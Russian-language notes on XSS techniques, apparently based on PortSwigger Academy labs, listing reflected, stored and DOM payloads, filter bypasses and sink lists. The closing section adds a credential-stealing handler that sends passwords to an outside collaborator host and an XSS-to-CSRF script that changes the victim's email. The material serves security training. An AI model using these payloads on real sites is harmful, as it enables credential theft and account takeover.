[Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

[Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

To do:
- https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
- https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- https://portswigger.net/web-security/cross-site-scripting/dangling-markup

# XSS PoC

`alert(document.domain)` or `print()`

# Reflected XSS

Функция поиска, которая получает поисковый запрос от пользователя в параметре URL:

```
https://insecure-website.com/search?term=gift
```

```html
<p>You searched for: gift</p>
```

Эксплуатация:

```html
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```

```html
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

## XSS между тегами HTML

Когда контекст XSS представляет собой текст между тегами HTML, необходимо ввести несколько новых тегов HTML, предназначенных для запуска выполнения JavaScript.

Lab: [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

```html
<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

Lab: [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

```html
<script> location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>
```

Lab: [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

```html
"><svg><animatetransform onbegin=alert(1)>
```

## XSS в атрибутах тегов HTML

Когда контекст XSS находится в значении атрибута HTML-тега, иногда можно прервать значение атрибута, закрыть тег и ввести новый. Например:

```html
"><script>alert(document.domain)</script>
```

Чаще всего в такой ситуации угловые скобки блокируются или кодируются, поэтому ваш ввод не может выйти за пределы тега, в котором он появляется. При условии, что вы можете прервать значение атрибута, вы можете ввести новый атрибут, который создает контекст, доступный для сценария, например, обработчик события. Например:

```js
" autofocus onfocus=alert(document.domain) x="
```

Приведенная выше полезная нагрузка создает событие `onfocus`, которое будет выполнять JavaScript, когда элемент получает фокус, а также добавляет атрибут `autofocus`, чтобы попытаться вызвать событие `onfocus` автоматически без какого-либо взаимодействия с пользователем. Наконец, он добавляет `x="`, чтобы изящно исправить следующую разметку. 

Вы можете встретить сайты, которые кодируют угловые скобки, но при этом позволяют вводить атрибуты. Иногда такие инъекции возможны даже в тегах, которые обычно не вызывают автоматических событий, например, в каноническом теге. Это поведение можно использовать с помощью ключей доступа и взаимодействия с пользователем в **Chrome**. Ключи доступа позволяют создавать комбинации клавиш, которые ссылаются на определенный элемент. Атрибут `accesskey` позволяет определить букву, при нажатии которой в сочетании с другими клавишами (они различаются для разных платформ) будут происходить события. В следующем уроке вы сможете поэкспериментировать с ключами доступа и использовать канонический тег. 

```
https://0af7003f04f4cba8c06055c5004e0084.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```

Чтобы запустить эксплойт, нажмите одну из следующих комбинаций клавиш:

Windows: `ALT+SHIFT+X`

MacOS: `CTRL+ALT+X`

Linux: `ALT+X`

## XSS в JavaScript

Когда контекстом XSS является некоторый существующий JavaScript в ответе, могут возникнуть самые разные ситуации, причем для успешной эксплуатации необходимы различные техники.
### Завершение существующего сценария

В простейшем случае можно просто закрыть тег script, заключающий существующий JavaScript, и ввести несколько новых HTML-тегов, которые вызовут выполнение JavaScript. Например, если контекст XSS выглядит следующим образом:

```html
<script>
...
var input = 'controllable data here';
...
</script>
```

то можно использовать следующую полезную нагрузку, чтобы вырваться из существующего JavaScript и выполнить свой собственный:

```html
</script><img src=1 onerror=alert(document.domain)>
```

Это работает потому, что браузер сначала выполняет разбор HTML для идентификации элементов страницы, включая блоки сценариев, и только затем выполняет разбор JavaScript для понимания и выполнения встроенных сценариев. Приведенная выше полезная нагрузка оставляет исходный сценарий разрушенным, с не завершенным строковым литералом. Но это не мешает последующему сценарию быть разобранным и выполненным обычным способом. 

### Выход из строки JavaScript

В случаях, когда XSS-контекст находится внутри quoted строкового литерала, часто можно вырваться из строки и выполнить JavaScript напрямую. Очень важно исправить сценарий, следующий за XSS-контекстом, потому что любые синтаксические ошибки в нем не позволят выполнить весь сценарий.

Некоторые полезные способы выхода за пределы строкового литерала: 
```js
'-alert(document.domain)-'
';alert(document.domain)//
```

Некоторые приложения пытаются предотвратить выход ввода за пределы строки JavaScript, экранируя любые символы одинарной кавычки обратной косой чертой. Обратная косая черта перед символом говорит синтаксическому анализатору JavaScript, что этот символ следует интерпретировать буквально, а не как специальный символ, например, терминатор строки. В этой ситуации приложения часто совершают ошибку, не экранируя сам символ обратной косой черты. Это означает, что злоумышленник может использовать свой собственный символ обратной косой черты, чтобы нейтрализовать обратную косую черту, добавленную приложением.

Например, предположим, что ввод:

```js
';alert(document.domain)//
```

преобразуется в:

```js
\';alert(document.domain)//
```

Теперь вы можете использовать альтернативную полезную нагрузку:

```js
\';alert(document.domain)//
```

которая преобразуется в:

```js
\\\';alert(document.domain)//
```

Здесь первый обратный слеш означает, что второй обратный слеш интерпретируется буквально, а не как специальный символ. Это означает, что кавычка теперь интерпретируется как терминатор строки, и атака проходит успешно. 

Некоторые сайты усложняют XSS, ограничивая допустимые символы. Это может быть сделано на уровне сайта или путем развертывания WAF, который не позволяет вашим запросам достичь сайта. В таких ситуациях необходимо экспериментировать с другими способами вызова функций, которые позволяют обойти эти меры безопасности. Один из способов сделать это - использовать оператор `throw` с обработчиком исключений. Это позволяет передавать аргументы в функцию без использования круглых скобок. Следующий код назначает функцию `alert()` глобальному обработчику исключений, а оператор `throw` передает `1` обработчику исключений (в данном случае `alert`). В итоге функция `alert()` вызывается с 1 в качестве аргумента.

```js
onerror=alert;throw 1
```

### XSS в литералах шаблонов JavaScript

Шаблонные литералы JavaScript - это строковые литералы, в которые можно вставлять выражения JavaScript. Встроенные выражения выполняются и обычно конкатенируются в окружающий текст. Шаблонные литералы заключаются в бэктики вместо обычных кавычек, а встроенные выражения идентифицируются с помощью синтаксиса `${...}`.

Например, следующий сценарий выводит приветственное сообщение, включающее отображаемое имя пользователя:

```js
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

Когда XSS-контекст находится в литерале шаблона JavaScript, нет необходимости завершать литерал. Вместо этого нужно просто использовать синтаксис` ${...}` для вставки выражения JavaScript, которое будет выполнено при обработке литерала. Например, если XSS-контекст выглядит следующим образом:

```html
<script>
...
var input = `контролируемые данные здесь`;
...
</script>
```

тогда вы можете использовать следующую полезную нагрузку для выполнения JavaScript без завершения литерала шаблона:

```js
${alert(document.domain)}
```

# Stored XSS

Веб-сайт позволяет пользователям оставлять комментарии к записям в блоге, которые отображаются другим пользователям. Пользователи отправляют комментарии с помощью HTTP-запроса, как показано ниже: 

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

После отправки этого комментария любой пользователь, который посетит эту запись в блоге, получит в ответе приложения следующее:

```html
<p>This post was extremely helpful.</p>

<script>/* Bad stuff here... */</script>
```

Эксплуатация:

```html
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E

<p><script>/* Bad stuff here... */</script></p>
```

## XSS в атрибутах тегов HTML

Иногда XSS-контекст заключается в атрибуте HTML-тега, который сам по себе может создавать контекст для сценариев. Здесь можно выполнить JavaScript без необходимости завершать значение атрибута. Например, если контекст XSS находится в атрибуте `href` тега якоря, вы можете использовать псевдопротокол `javascript` для выполнения сценария. Например:

```html
<a href="javascript:alert(document.domain)">
```

## XSS в JavaScript

#### Использование HTML-кодирования

Когда контекстом XSS является некоторый существующий JavaScript внутри атрибута quoted тега, например, обработчик события, можно использовать HTML-кодирование для обхода некоторых фильтров ввода.

Когда браузер разбирает HTML-теги и атрибуты в ответе, он выполняет HTML-декодирование значений атрибутов тегов перед их дальнейшей обработкой. Если приложение на стороне сервера блокирует или санирует определенные символы, которые необходимы для успешного XSS-эксплойта, вы часто можете обойти проверку ввода путем HTML-кодирования этих символов.

Например, если контекст XSS выглядит следующим образом:

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

и приложение блокирует или экранирует символы одиночных кавычек, вы можете использовать следующую полезную нагрузку, чтобы выйти из строки JavaScript и выполнить свой собственный сценарий:

```js
&apos;-alert(document.domain)-&apos;
```

Последовательность `&apos;` - это HTML-сущность, представляющая апостроф или одинарную кавычку. Поскольку браузер HTML-декодирует значение атрибута `onclick` до интерпретации JavaScript, сущности декодируются как кавычки, которые становятся разделителями строк, поэтому атака проходит успешно.

Из лабы [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped):

```
postId=9&comment=3&name=2&email=1%401.com&website=https%3A%2F%2F0ac3007c0345c54dc0d33269001600f4.web-security-academy.net%2Fpost%3FpostId%3D9%3f%26apos;-alert(document.domain)-%26apos;
```

# DOM-based XSS

XSS на основе DOM (также известный как DOM XSS) обычно возникают, когда JavaScript берет данные из контролируемого злоумышленником источника, например URL, и передает их в поглотитель (sink), который поддерживает динамическое выполнение кода, например `eval()` или `innerHTML`. Это позволяет злоумышленникам выполнять вредоносный JavaScript, который обычно позволяет им захватывать учетные записи других пользователей.

В следующем примере приложение использует JavaScript для чтения значения из поля ввода и записи этого значения в элемент HTML:

```js
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

Если злоумышленник может контролировать значение поля ввода, он может легко сконструировать вредоносное значение, которое вызовет выполнение его собственного сценария:

```html
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
```

В типичном случае поле ввода заполняется из части HTTP-запроса, например, из параметра строки запроса URL, что позволяет злоумышленнику осуществить атаку с использованием вредоносного URL, аналогично отраженному XSS. 

Чтобы осуществить XSS-атаку на основе DOM, необходимо поместить данные в источник таким образом, чтобы они распространялись в сток и вызывали выполнение произвольного JavaScript.

Наиболее распространенным источником для DOM XSS является URL, доступ к которому обычно осуществляется с помощью объекта `window.location`. Злоумышленник может создать ссылку, отправляющую жертву на уязвимую страницу с полезной нагрузкой в строке запроса и фрагментировать часть URL. В определенных обстоятельствах, например, когда целью является страница 404 или веб-сайт, работающий на PHP, полезная нагрузка также может быть помещена в путь.

## Как проверить DOM XSS

### Тестирование HTML sink

Для проверки на DOM XSS в HTML-синке поместите в источник случайную буквенно-цифровую строку (например, `location.search`), затем с помощью инструментов разработчика просмотрите HTML и найдите места, где появляется ваша строка. Обратите внимание, что опция браузера "Просмотр источника" не подходит для тестирования DOM XSS, поскольку она не учитывает изменения, которые были внесены в HTML с помощью JavaScript. В инструментах разработчика Chrome вы можете использовать `Control+F` (или `Command+F` на MacOS) для поиска строки в DOM.

Для каждого места, где строка появляется в DOM, необходимо определить контекст. Исходя из этого контекста, вам нужно уточнить свой ввод, чтобы увидеть, как он будет обработан. Например, если ваша строка появляется в атрибуте с двойными кавычками, попробуйте вставить двойные кавычки в вашу строку, чтобы посмотреть, сможете ли вы вырваться за пределы атрибута.

Обратите внимание, что браузеры ведут себя по-разному в отношении URL-кодирования. Chrome, Firefox и Safari будут URL-кодировать `location.search` и `location.hash`, в то время как IE11 и Microsoft Edge (до появления Chrome) не будут URL-кодировать эти источники. Если ваши данные получают URL-кодирование перед обработкой, то XSS-атака вряд ли сработает.

### Тестирование синков выполнения JavaScript

Тестирование синков выполнения JavaScript на наличие XSS на основе DOM немного сложнее. В этих синках ваш ввод не обязательно появляется где-либо в DOM, поэтому вы не можете его искать. Вместо этого вам придется использовать отладчик JavaScript, чтобы определить, отправляется ли ваш ввод в синк и каким образом.

Для каждого потенциального источника, такого как `location`, сначала нужно найти случаи в коде JavaScript страницы, когда на этот источник ссылаются. В инструментах разработчика Chrome вы можете использовать `Control+Shift+F` (или `Command+Alt+F` на MacOS) для поиска источника в JavaScript-коде страницы.

Найдя место, где считывается источник, вы можете использовать отладчик JavaScript, чтобы добавить точку останова и проследить, как используется значение источника. Вы можете обнаружить, что источник присваивается другим переменным. В этом случае вам нужно будет снова воспользоваться функцией поиска, чтобы отследить эти переменные и узнать, передаются ли они в поглотитель. Когда вы найдете поглотитель, которому присваиваются данные, полученные из источника, вы можете использовать отладчик для проверки значения, наведя курсор на переменную, чтобы показать ее значение перед отправкой в поглотитель. Затем, как и в случае с поглотителями HTML, необходимо уточнить вводимые данные, чтобы проверить, сможете ли вы провести успешную XSS-атаку. 

### Тестирование на DOM XSS с помощью DOM Invader

Выявление и эксплуатация DOM XSS в природе может быть утомительным процессом, часто требующим ручного просмотра сложного, минифицированного JavaScript. Однако если вы используете браузер Burp, вы можете воспользоваться преимуществами встроенного расширения DOM Invader, которое сделает за вас большую часть тяжелой работы. 

[DOM Invader documentation](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)

## Эксплуатация DOM XSS с различными источниками и синками

Веб-сайт уязвим для межсайтового скриптинга на основе DOM, если существует исполняемый путь, по которому данные могут распространяться от источника к поглотителю. На практике различные источники и поглотители имеют различные свойства и поведение, которые могут повлиять на возможность эксплуатации и определить, какие методы необходимы. Кроме того, скрипты веб-сайта могут выполнять проверку или другую обработку данных, которые необходимо учитывать при попытке использовать уязвимость. Существует целый ряд поглотителей, которые имеют отношение к уязвимостям на основе DOM. Для получения подробной информации обратитесь к приведенному ниже [[#Какие синки могут привести к уязвимостям DOM-XSS|списку]].

Синк `document.write` работает с элементами `script`, поэтому вы можете использовать простую полезную нагрузку, например:

```js
document.write('... <script>alert(document.domain)</script> ...');
```

Обратите внимание, однако, что в некоторых ситуациях содержимое, которое записывается в `document.write`, включает некоторый окружающий контекст, который необходимо учитывать в вашем эксплойте. Например, вам может понадобиться закрыть некоторые существующие элементы перед использованием полезной нагрузки JavaScript.

Синк `innerHTML` не принимает элементы `script` ни в одном современном браузере, также как и события `svg onload`. Это означает, что вам придется использовать альтернативные элементы, такие как `img` или `iframe`. В сочетании с этими элементами можно использовать обработчики событий, такие как `onload` и `onerror`. Например:

```js
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

### Источники и синки в зависимостях сторонних разработчиков

Современные веб-приложения обычно строятся с использованием ряда сторонних библиотек и фреймворков, которые часто предоставляют разработчикам дополнительные функции и возможности. Важно помнить, что некоторые из них также являются потенциальными источниками и синками DOM XSS. 

#### DOM XSS в jQuery

Если используется библиотека JavaScript, такая как jQuery, обратите внимание на синки, которые могут изменять элементы DOM на странице. Например, функция jQuery `attr()` может изменять атрибуты элементов DOM. Если данные считываются из контролируемого пользователем источника, например URL, а затем передаются в функцию `attr()`, то можно манипулировать переданным значением, чтобы вызвать XSS. Например, здесь мы имеем JavaScript, который изменяет атрибут `href` элемента якоря, используя данные из URL:

```js
$(function() { 
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

Это можно использовать, изменив URL таким образом, чтобы источник `location.search` содержал вредоносный URL JavaScript. После того как JavaScript страницы применит этот вредоносный URL к `href` обратной ссылке, щелчок по обратной ссылке приведет к его выполнению: 

```
?returnUrl=javascript:alert(document.domain)
```

Еще один потенциальный синк, на который следует обратить внимание, - функция селектора `$()` jQuery, которая может использоваться для внедрения вредоносных объектов в DOM.

Раньше jQuery был очень популярен, и классическая уязвимость DOM XSS была вызвана тем, что веб-сайты использовали этот селектор в сочетании с источником `location.hash` для анимации или автопрокрутки к определенному элементу на странице. Такое поведение часто реализовывалось с помощью уязвимого обработчика события `hashchange`, похожего на следующее: 

```js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});`
```

Поскольку `hash` контролируется пользователем, злоумышленник может использовать это для внедрения XSS-вектора в сток селектора `$()`. Более поздние версии jQuery исправили эту уязвимость, запретив вводить HTML в селектор, когда входные данные начинаются с символа хэша (`#`). Тем не менее, вы все еще можете найти уязвимый код в природе.

Чтобы действительно использовать эту классическую уязвимость, вам нужно найти способ вызвать триггер `hashchange` без участия пользователя. Один из самых простых способов сделать это - передать эксплойт через `iframe`: 

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

В этом примере атрибут `src` указывает на уязвимую страницу с пустым значением хэша. Когда `iframe` загружается, к хэшу добавляется XSS-вектор, вызывая событие `hashchange`.

___Обратите внимание___
Даже новые версии jQuery все еще могут быть уязвимы через синк селектора `$()`, при условии, что у вас есть полный контроль над его вводом из источника, не требующего префикса `#`.

[DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

#### DOM XSS в AngularJS

Если используется такой фреймворк, как AngularJS, возможно выполнение JavaScript без угловых скобок и событий. Когда на сайте используется атрибут `ng-app` на элементе HTML, он будет обработан AngularJS. В этом случае AngularJS выполнит JavaScript внутри двойных фигурных скобок, которые могут встречаться непосредственно в HTML или внутри атрибутов. 

[DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

```js
{{$on.constructor('alert(1)')()}}
```

## DOM XSS в сочетании с отраженными и сохраненными данными

Некоторые чистые уязвимости на основе DOM являются самодостаточными в пределах одной страницы. Если скрипт считывает некоторые данные из URL и записывает их в опасный поглотитель, то уязвимость полностью находится на стороне клиента.

Однако источники не ограничиваются данными, которые непосредственно открываются браузерами - они также могут исходить от веб-сайта. Например, веб-сайты часто отражают параметры URL в HTML-ответе от сервера. Обычно это ассоциируется с обычным XSS, но это также может привести к так называемым _reflected+DOM_ уязвимостям.

В случае _reflected+DOM_ уязвимости сервер обрабатывает данные из запроса и отражает их в ответе. Отраженные данные могут быть помещены в строковый литерал JavaScript или элемент данных в DOM, например, поле формы. Затем сценарий на странице обрабатывает отраженные данные небезопасным способом, в конечном итоге записывая их в опасный сток. 

```js
eval('var data = "reflected string"');
```

Lab: [Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

```js
\"-alert(1)}//
```

Веб-сайты также могут хранить данные на сервере и отражать их в другом месте. При уязвимости _stored+DOM_ сервер получает данные от одного запроса, сохраняет их, а затем включает в последующий ответ. Скрипт в последующем ответе содержит синк, который затем обрабатывает данные небезопасным способом. 

```js
element.innerHTML = comment.author
```

Lab: [Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)

```js
<><img+src=1+onerror=alert(1)>
```

### Какие синки могут привести к уязвимостям DOM-XSS?

Ниже перечислены основные синки, которые могут привести к уязвимостям DOM XSS: 

```js
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

Следующие функции jQuery также являются синками, которые могут привести к уязвимостям DOM XSS: 

```js
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

# XSS Exploitation cases

## steal credentials

```js
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://5lrhnj3lgso1cmbjq0cck5h1ksqie7.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

## xss to csrf

xss to csrf with csrf token

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```